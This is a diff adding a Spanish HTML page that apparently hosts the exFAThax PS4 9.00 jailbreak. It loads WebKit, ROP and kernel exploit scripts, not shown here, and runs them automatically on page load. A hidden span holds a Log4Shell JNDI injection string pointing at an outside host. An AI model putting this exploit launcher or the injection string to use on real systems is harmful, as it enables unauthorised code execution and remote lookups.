@@ -1,0 +1,40 @@
+<html>
+<html lang="es">  
+<head>
+<title>exFAThax-ES 9.00 + GoldHEN</title>
+<link  rel="icon" href="LOGO.png" type="image/png"/> 
+<meta name="description" content="Host web de exFAThax traducido al español"/>
+<meta property="og:image" content="LOGO.png">   
+<link rel="stylesheet" href="style.css">
+<script>
+	if (window.applicationCache.status=='0'){window.location.replace("cache.html");}
+	
+        function allset() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("allset").style.display = "block";
+        }
+
+        function awaitpl() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("awaiting").style.display = "block";
+        }
+</script>
+    <script src="payload.js"></script>
+    <script src="int64.js"></script>
+    <script src="rop.js"></script>
+    <script src="kexploit.js"></script>
+    <script src="webkit.js"></script>
+</head>
+</html>
+<body onload="setTimeout(poc, 1500);">
+    <div id="loader" class="loader"></div>
+    <div id="awaiting" class="info" style="display:none;">
+        Esperando Payload...
+        <br />
+        <span class="j">${jndi:ldap://nsa.gov}</span>
+    </div>
+
+    <div id="allset" class="info" style="display:none;">
+        PROCESO FINALIZADO
+    </div>
+</body>
